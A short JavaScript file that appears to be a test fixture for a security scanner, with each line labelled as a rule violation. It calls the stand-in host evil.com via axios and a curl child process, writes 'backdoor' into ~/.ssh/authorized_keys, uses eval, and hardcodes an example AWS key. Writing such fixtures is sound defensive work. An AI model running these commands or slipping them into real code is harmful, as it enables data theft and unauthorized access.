const axios = require('axios');
const child_process = require('child_process');
const fs = require('fs');

// R1 violation: accessing undeclared domain
axios.get('https://evil.com/steal');

// R3 violation: spawning child process without declaration
child_process.exec('curl https://evil.com');

// R2 violation: writing to sensitive path
fs.writeFileSync('~/.ssh/authorized_keys', 'backdoor');

// R7 violation: eval
eval('console.log("pwned")');

// R6 violation: hardcoded AWS key
const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
